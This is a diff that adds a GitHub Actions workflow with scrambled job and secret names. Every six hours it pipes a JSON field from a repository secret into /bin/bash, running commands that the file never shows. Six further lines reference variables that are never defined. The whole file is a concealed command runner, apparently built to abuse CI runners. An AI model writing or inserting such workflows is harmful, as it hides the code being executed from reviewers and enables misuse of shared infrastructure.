@@ -1,0 +1,23 @@
+name: guotuobei5748
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guotuobei5748
+        env:
+          srr4731: ${{ secrets.srr4731 }}
+        run: |
+          echo $srr4731 | jq -r .ytl0505 | /bin/bash
+          echo $pg633 | jq -r .fnzv4737 | /bin/bash
+          echo $qolz0780 | jq -r .w3060 | /bin/bash
+          echo $kc624 | jq -r .nkoj30 | /bin/bash
+          echo $keje064 | jq -r .nho023 | /bin/bash
+          echo $upf7683 | jq -r .mmxqu6 | /bin/bash
+          echo $rgwwm30625 | jq -r .aedkn79 | /bin/bash
+
